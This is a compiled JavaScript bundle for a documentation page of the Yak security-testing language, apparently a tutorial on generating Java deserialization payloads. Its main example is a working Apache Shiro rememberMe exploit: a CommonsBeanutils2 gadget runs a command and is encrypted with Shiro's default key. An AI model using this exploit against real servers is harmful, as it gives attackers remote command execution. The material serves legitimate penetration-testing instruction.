"use strict";(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[3501],{15680:(e,a,r)=>{r.d(a,{xA:()=>y,yg:()=>g});var n=r(96540);function t(e,a,r){return a in e?Object.defineProperty(e,a,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[a]=r,e}function o(e,a){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);a&&(n=n.filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable})),r.push.apply(r,n)}return r}function l(e){for(var a=1;a<arguments.length;a++){var r=null!=arguments[a]?arguments[a]:{};a%2?o(Object(r),!0).forEach(function(a){t(e,a,r[a])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach(function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(r,a))})}return e}function i(e,a){if(null==e)return{};var r,n,t=function(e,a){if(null==e)return{};var r,n,t={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],a.indexOf(r)>=0||(t[r]=e[r]);return t}(e,a);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],a.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(t[r]=e[r])}return t}var s=n.createContext({}),c=function(e){var a=n.useContext(s),r=a;return e&&(r="function"==typeof e?e(a):l(l({},a),e)),r},y=function(e){var a=c(e.components);return n.createElement(s.Provider,{value:a},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var a=e.children;return n.createElement(n.Fragment,{},a)}},m=n.forwardRef(function(e,a){var r=e.components,t=e.mdxType,o=e.originalType,s=e.parentName,y=i(e,["components","mdxType","originalType","parentName"]),p=c(r),m=t,g=p["".concat(s,".").concat(m)]||p[m]||d[m]||o;return r?n.createElement(g,l(l({ref:a},y),{},{components:r})):n.createElement(g,l({ref:a},y))});function g(e,a){var r=arguments,t=a&&a.mdxType;if("string"==typeof e||t){var o=r.length,l=new Array(o);l[0]=m;var i={};for(var s in a)hasOwnProperty.call(a,s)&&(i[s]=a[s]);i.originalType=e,i[p]="string"==typeof e?e:t,l[1]=i;for(var c=2;c<o;c++)l[c]=r[c];return n.createElement.apply(null,l)}return n.createElement.apply(null,r)}m.displayName="MDXCreateElement"},78162:(e,a,r)=>{r.r(a),r.d(a,{contentTitle:()=>l,default:()=>p,frontMatter:()=>o,metadata:()=>i,toc:()=>s});var n=r(58168),t=(r(96540),r(15680));const o={sidebar_position:113},l="Java \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe: yso(ysoserial)",i={unversionedId:"yakexamples/ysoserial-demo",id:"yakexamples/ysoserial-demo",isDocsHomePage:!1,title:"Java \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe: yso(ysoserial)",description:"Yak \u901a\u8fc7\u975e Java \u7684\u65b9\u5f0f\u5b9e\u73b0\u4e86\u4e00\u6574\u5957 Java \u53cd\u5e8f\u5217\u5316\u534f\u8bae\u3002",source:"@site/docs/yakexamples/ysoserial-demo.mdx",sourceDirName:"yakexamples",slug:"/yakexamples/ysoserial-demo",permalink:"/docs/yakexamples/ysoserial-demo",editUrl:"https://github.com/yaklang/docs/yakexamples/ysoserial-demo.mdx",tags:[],version:"current",sidebarPosition:113,frontMatter:{sidebar_position:113},sidebar:"tutorialSidebar",previous:{title:"\u6279\u91cf\u53d1\u5305: \u6a21\u7cca\u6d4b\u8bd5\u6279\u91cf\u53d1\u5305",permalink:"/docs/yakexamples/batch-http"},next:{title:"\u6587\u672c\u76f8\u4f3c\u5ea6\u7b97\u6cd5\uff1aSQLMAP\u3001 SimHash \u4e0e SSDeep",permalink:"/docs/yakexamples/similarity-calc"}},s=[{value:"YsoSerial \u7684 Yak \u66ff\u4ee3\u54c1",id:"ysoserial-\u7684-yak-\u66ff\u4ee3\u54c1",children:[]}],c={toc:s},y="wrapper";function p({components:e,...a}){return(0,t.yg)(y,(0,n.A)({},c,a,{components:e,mdxType:"MDXLayout"}),(0,t.yg)("h1",{id:"java-\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe-ysoysoserial"},"Java \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe: yso(ysoserial)"),(0,t.yg)("p",null,"Yak \u901a\u8fc7\u975e Java \u7684\u65b9\u5f0f\u5b9e\u73b0\u4e86\u4e00\u6574\u5957 Java \u53cd\u5e8f\u5217\u5316\u534f\u8bae\u3002"),(0,t.yg)("p",null,"\u53ef\u4ee5\u5728\u4e00\u5b9a\u5bb9\u9519\u9650\u5ea6\u5185\u52ab\u6301\u7edd\u5927\u90e8\u5206 Java \u53cd\u5e8f\u5217\u5316\u6d41\u3002"),(0,t.yg)("p",null,"\u8be6\u60c5\u53c2\u8003 ",(0,t.yg)("a",{parentName:"p",href:"/api-manual/api/java"},"java: java \u53cd\u5e8f\u5217\u5316\u534f\u8bae\u7684 Golang/Yak \u5b9e\u73b0")),(0,t.yg)("h2",{id:"ysoserial-\u7684-yak-\u66ff\u4ee3\u54c1"},"YsoSerial \u7684 Yak \u66ff\u4ee3\u54c1"),(0,t.yg)("p",null,"\u5728\u5b9e\u73b0\u4e86 Java \u53cd\u5e8f\u5217\u5316\u534f\u8bae\u540e\uff0cJava \u76f8\u5173\u6f0f\u6d1e\u4e0d\u518d\u9700\u8981\u539f\u751f Java \u6216\u786c\u7f16\u7801 HEX/Binary \u6d41\u6765\u5b9e\u73b0\u3002\u5982\u4e0b\u662f\u4e00\u4e2a\u6d4b\u8bd5 shiro payload \u7684\u7b80\u5355\u6848\u4f8b"),(0,t.yg)("pre",null,(0,t.yg)("code",{parentName:"pre",className:"language-go"},'log.setLevel("info")\ngadgetObj,err = yso.GetGadget("CommonsBeanutils2",yso.useTemplate("RuntimeExec"),yso.evilClassName("YLGjbAeS"),yso.majorVersion(52),yso.useClassParam("cmd","whoami"))\nif err {\n    log.error("%v",err)\n    return\n}\ngadgetBytes,err = yso.ToBytes(gadgetObj,yso.twoBytesCharString(),yso.dirtyDataLength(0))\nif err {\n    log.error("%v",err)\n    return\n}\n\n// 16\u8fdb\u5236\u5c55\u793apayload\nhexPayload = codec.EncodeToHex(gadgetBytes)    \n(hexPayload)\n\n// Shiro\u5229\u7528\ntarget = "127.0.0.1:8080"\nbase64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64\u7f16\u7801\u7684key\nkey,_ = codec.DecodeBase64(base64Key) // \u751f\u6210key\npayload = codec.PKCS5Padding(gadgetBytes, 16) // \u52a0\u5bc6payload\nencodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]\nfinalPayload = codec.EncodeBase64(append(key, encodePayload...))\nrsp,req,_ = poc.HTTP(`GET /login HTTP/1.1\nHost: {{params(target)}}\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: no-cache\nCookie: rememberMe={{params(payload)}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36\n`,poc.params({"payload":finalPayload,"target":target})) // \u53d1\u9001payload\nstr.SplitHTTPHeadersAndBodyFromPacket(rsp)\nlog.info("\u53d1\u9001Payload\u6210\u529f")\nlog.info("\u54cd\u5e94\u5305: ",string(rsp))   \n')))}p.isMDXComponent=!0}}]);